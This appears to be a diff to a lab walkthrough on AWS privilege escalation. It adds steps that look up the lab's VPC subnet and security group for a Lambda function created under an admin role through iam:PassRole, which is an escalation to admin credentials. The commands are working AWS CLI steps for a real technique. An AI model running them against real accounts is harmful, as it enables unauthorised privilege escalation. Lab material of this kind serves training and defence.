@@ -65,6 +65,18 @@ cd /tmp && zip -q lambda_function.zip lambda_function.py
 
 This is the privilege escalation moment. By specifying the admin role as the `--role`, you are exercising `iam:PassRole` -- attaching an IAM role you don't yourself hold to a compute resource you control:
 
+Hosted environments run Lambda inside an isolated VPC. Discover the lab's subnet and security group, then include them when you create the function:
+
+```bash
+SUBNET_ID=$(aws ec2 describe-subnets \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-001-to-admin-subnet" \
+    --query 'Subnets[0].SubnetId' --output text)
+
+SG_ID=$(aws ec2 describe-security-groups \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-001-to-admin-function-sg" \
+    --query 'SecurityGroups[0].GroupId' --output text)
+```
+
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-admin-target-role"
@@ -75,7 +87,8 @@ aws lambda create-function \
     --role "$ADMIN_ROLE_ARN" \
     --handler lambda_function.lambda_handler \
     --zip-file fileb:///tmp/lambda_function.zip \
-    --timeout 30
+    --timeout 30 \
+    --vpc-config SubnetIds=${SUBNET_ID},SecurityGroupIds=${SG_ID}
 ```
 
 Lambda accepts the request, creates the function, and binds the admin role to it. AWS will mint temporary credentials for `pl-prod-lambda-001-to-admin-target-role` whenever the function is invoked.
